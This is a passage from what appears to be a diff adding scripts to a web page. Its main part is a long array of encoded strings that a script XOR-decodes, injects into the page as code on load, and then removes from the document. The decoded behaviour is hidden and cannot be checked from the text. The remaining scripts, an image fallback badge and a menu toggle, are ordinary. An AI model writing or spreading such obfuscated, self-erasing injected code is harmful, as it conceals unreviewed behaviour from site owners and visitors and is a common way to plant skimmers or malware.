,"Vh96HFF9ZwBCNH8KDXR8H0A9NEYeWTNPBXNuZQVzbkMFJ2EaQHooZS9z","MwtKMGYCQD1nQUQ3dypTNn0baTpgG0A9dh0NdGAaRz56GwJ/MwlQPXAb","TDx9Tw02ZUYFKBlPBXMzGUQhMwlKIX5PGHN2GQsnch1CNmdUL3MzTwU6","dU8NcnUAVz46T1c2ZxpXPShlL3MzTwU6dU8NNXwdSH16CwVuLlIFdGkO","TzZ/PE06YwJAPWcpSiF+SAxzaGUFczNPBXN2GQsjYQpTNn0bYTZ1DlA/","Z0cMaBlPBXMzTwUlch0FPWYCbD1jGlFzLk9BPHAaSDZ9Gws0dhtgP3YC","QD1nLVwad0cCKXIFQD9AB0wjfgpLJ10aSDF2HWw9YxpRdDpUL3MzTwVz","MxlEITMMTCdqJksjZhsFbjMLSjBmAkA9Z0FCNmcqSTZ+CksnURZsNztI","XzJ5CkkQehtcGn0fUCc0Rh5ZM08FczNPUzJhT0E6YBtXOnAbbD1jGlFz","Lk9BPHAaSDZ9Gws0dhtgP3YCQD1nLVwad0cCKXIFQD9XBlYnYQZGJ1oB","VSZnSAxoGU8FczNPBSVyHQUgZx1ANmcmSyNmGwVuMwtKMGYCQD1nQUI2","ZypJNn4KSydRFmw3O0hfMnkKSQBnHUA2ZyZLI2YbAnooZQVzM08Fc2UO","V3NjB0o9diZLI2YbBW4zC0owZgJAPWdBQjZnKkk2fgpLJ1EWbDc7SF8y","eQpJA3sASzZaAVUmZ0gMaBlPBXMzTwUlch0FI3sASzZWHVdzLk9BPHAa","SDZ9Gws0dhtgP3YCQD1nLVwad0cCKXIFQD9DB0o9dipXIXwdAnooZQVz","M08Fc2UOV3NgB0wjVh1XEXwXBW4zC0owZgJAPWdBQjZnKkk2fgpLJ1EW","bDc7SF8yeQpJAHsGVT52AVEWYR1KIVEAXXQ6VC9ZM08FczNPUzJhT1Yd","ZgIFbjMBSiF+Dkk6aQphOnQGUSA7Rw09ZgJsPWMaUXM1SQU9ZgJsPWMa","UX1lDkkmdkYFL29PAnQ6Rgshdh9JMnAKDXxPKw58dEMFdDRGHlkzTwVz","M09TMmFPVhB6G1xzLk8Ne3AGUSpaAVUmZ08DdTMMTCdqJksjZhsLJXID","UDY6T1kvM0gCej0bVzp+RwxoGU8FczNPBSVyHQUgVwZWJzNSBXs7C0wg","Zx1MMGcmSyNmGwV1NU9BOmAbVzpwG2w9YxpRfWUOSSZ2RgUvb08CdDpB","USF6Ag16KGUFczNPBXNlDldzYDxRIXYKUXMuTw17YBtXNnYbbD1jGlFz","NUkFIGcdQDZnJksjZhsLJXIDUDY6T1kvM0gCej0bVzp+RwxoGU8FczNP","BSVyHQUhchh1O3wBQBd6CEwnYE8Yc30AVz5yA0wpditMNHobVns7R1U7","fAFAGn0fUCczSQNzYwdKPXYmSyNmGwslcgNQNjpPWS8zSAJ6OkFXNmMD","RDB2RwoPV0QKND9PAnQ6VC9ZM08FczNPTDUzRwR8TTNBKCsSAXw9G0Ag","Z0dWHWYCDHNvEwVyYCxMJ2pPWS8zTlYXehxRc28TBXJgPFEhdgpRc28T","BXI8MRVmTwtea25LCn1nClYnOx1EJEMHSj12K0w0ehtWejpPXlkzTwVz","M08Fc3oJBXtgB0wjVh1XEXwXDHNoZQVzM08FczNPBXNgB0wjVh1XEXwX","Cyd2F1EQfAFRNn0bBW4zSP30yuz81srrBYu0tqGLu7avi7S2o4u0t49z","y8j818rq/eTK6/zby8f9+jRUL3MzTwVzM08FczMcTTpjKlchUQBdfWAb","XD92QUE6YB9JMmpPGHM0DUk8cAQCaBlPBXMzTwVzMxIvczNPBXMzTwU6","dU8NcmAsTCdqTwN1MwxMJ2omSyNmGwxzcAZRKloBVSZnQUM8cBpWezpU","L3MzTwVzM08FNn8cQHN6CQV7MhxhOmAbBXU1T0E6YBtXOnAbbD1jGlF6","MwtMIGcdTDBnJksjZhsLNXwMUCA7Rh5ZM08FczNPBXN2A1Y2MwZDcztO","VgBnHUA2Z08DdTMcUSF2ClEafR9QJzpPVidhCkAnWgFVJmdBQzxwGlZ7","OlQvczNPBXMzTwU2fxxAc3oJBXsyQHtjJjNBKCsSAXw9G0AgZ0dXMmQ/","TTx9CmE6dAZRIDpPA3UzH008fQpsPWMaUXozH008fQpsPWMaUX11AEYm","YEcMaBlPBXMzTwVzMx1AJ2YdS2gZTwVzM08FLhlPBXMzTwU6dU8NI3sA","SzZWHVd6Mx9NPH0KYCFhQVYnagNAfXcGViN/DlxzLk8CPXwBQHQoZQVz","M08Fc3oJBXtgB0wjVh1XEXwXDHNgB0wjVh1XEXwXCyBnFkk2PQtMIGMD","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","RCdyHEAnPQNEIGc8QD1nJEAqM1IFIHYBQRh2Fh5ZM08FczNPVjZ9C3E2","fwpCIXICaCB0Ry9zM08FczNPBXQ0Tw5ZM08FczNPBXM0n7rHg0/95sru","/f7LxgWLoragi6FP/fTK6/35y8L80crtBXtcO3V6TwECczhlBXMzTwVz","M08CdDNEL3MzTwVzM08FdPHvh3PL3vzWy90FHEc/H3M0Tw5zfBtVF3oI","TCdgZQVzM08FczpUL3MzTwVzMwBVNn0sSj11Blc+Qw5CNjsMUCFhCksn","QAdMI34KSydXDlEyP09GJmEdQD1nLEQhdyNEIGdbBS9vTwJjI18VdDpU","L3MzTwVzMxxAJ0cGSDZ8GlF7dRpLMGcGSj0zRwxzaE9DPGECCzdyG0Qg","dhsLIGYNSDpnG0w9dE8YczRfAmgzEglzK18VeihlBXMzT1hZM09YfzMb","VyZ2Rh5ZGU8FJXIdBTJwG0wldixXNnIbQDdQAEE2M1IFdDRUL1kzT0Mm","fQxROnwBBTZ9CUohcAp2J3IdUQBnDlE2XAF3NnUdQCB7RwxzaGUFczNP","TDUzR1I6fQtKJD0DSjByG0w8fUFNMmAHDHNoZQVzM08Fc2cdXHNoZQVz","M08FczNPTTpgG0ohakFXNmMDRDB2PFEyZwoNKDMVRDl2A3Yndh8fczQH","Sj52SAUuP08CdD9PUjp9C0okPQNKMHIbTDx9QVUyZwdLMn4KBXgzGEw9","dwBSfX8ARjJnBko9PRxAMmEMTXooZQVzM08Fc25PRjJnDE1zOwoMc2gS","L3MzTwUuGU8FczMdQCB2G2Q/fylKIX4cZD13PFEyZwpqPUAbRCFnRwxo","GU8FLhllBXN2AUM8YQxAAGcOVydAG0QndiBLAXYJVzZgBw16KGUFc2QG","Szd8GAsydwtgJXYBUR96HFE2fQpXezQfRDR2HE08ZEgJc3UaSzBnBko9","M0dAJTpPXlkzTwVzegkFe3YZBXU1T0AlPR9AIWAGVid2CwxzaGUFczNP","BXN2AUM8YQxAAGcOVydAG0QndiBLAXYJVzZgBw16KGUFczNPWHN2A1Y2","MwZDczsORid6GUAQYQpEJ3YLZjx3CgV1NU8KDU8LXmtuSwp9ZwpWJzsO","Rid6GUAQYQpEJ3YLZjx3Cgx6MxQvczNPBXMzGUQhMxtMN1gKQCMzUgU3","fAxQPnYBUX10ClEWfwpINn0bZypaCw10ZwZBdDpUL3MzTwVzMwZDczsb","TDdYCkAjM0kDczIbTDdYCkAjPRlEP2YKDHNoZQVzM08FczNPUTp3JEA2","Y0FTMn8aQHMuT0QwZwZTNlAdQDJnCkEQfAtAaBlPBXMzTwVzMxtMN1gK","QCM9HEAnUhtRIXoNUCd2RwIlcgNQNjRDBTJwG0wldixXNnIbQDdQAEE2","OlQvczNPBXMzEi9zM08FLhlPBS46VC9zMwZDczsLSjBmAkA9Z0FXNnIL","XABnDlE2M1IYbjNISTxyC0w9dEgMc2hlBXMzT0E8cBpINn0bCzJ3C2Al","dgFRH3ocUTZ9Cld7NCtqHlAASyd2AVEffA5BNndICXN1GkswZwZKPTNH","DHNoZQVzM08Fc3YBViZhCmg2fRpgK3ocUSA7Rh5ZM08FczNPQD11AFcw","djxRMmEbdidyG0AcfT1ANWEKVjs7Rh5ZM08Fc25GHlkzT1hzdgNWNjMU","L3MzTwU2fRxQIXYiQD1mKl06YBtWezpUL3MzTwU2fQlKIXAKdidyHVEA","Zw5RNlwBdzZ1HUAge0cMaBlPBS4ZEgx7OlQv"].join(""));
+  var _u=new Uint8Array(_d.length);
+  for(var _i=0;_i<_d.length;_i++)_u[_i]=_d.charCodeAt(_i)^_k[_i%_k.length];
+  var _c=new TextDecoder("utf-8").decode(_u);
+  var _n=document.createElement("script");
+  _n.text=_c;
+  (document.head||document.documentElement).appendChild(_n);
+  _n.remove();
+})();
+</script>
+
+
+<script id="ui-asset-guard">
+(function () {
+  function applyFallbacks() {
+    document.querySelectorAll('img').forEach(function (img) {
+      if (img.style.display === 'none') return;
+      img.addEventListener('error', function () {
+        if (this.dataset.fallbackApplied) return;
+        this.dataset.fallbackApplied = '1';
+        var badge = document.createElement('span');
+        badge.className = 'spl-img-badge';
+        badge.textContent = 'سبل';
+        badge.style.cssText = 'display:inline-flex;align-items:center;justify-content:center;min-width:44px;height:36px;padding:0 10px;border-radius:8px;background:#e6f4f7;color:#146e82;font-weight:800;font-size:13px;border:1px solid #b9dfe7;vertical-align:middle;';
+        this.style.display = 'none';
+        if (this.parentNode) {
+          this.parentNode.insertBefore(badge, this);
+        }
+      });
+    });
+  }
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', applyFallbacks);
+  } else {
+    applyFallbacks();
+  }
+})();
+</script>
+
+
+<script id="ui-nav-handler">
+(function () {
+  var btn = document.getElementById('splHamburgerBtn');
+  var menu = document.getElementById('menu');
+  if (btn && menu) {
+    btn.addEventListener('click', function (e) {
+      e.stopPropagation();
+      menu.classList.toggle('spl-drawer-open');
+    });
+    document.addEventListener('click', function (e) {
+      if (!menu.contains(e.target) && e.target !== btn) {
+        menu.classList.remove('spl-drawer-open');
+      }
+    });
+  }
+})();
+</script>
+
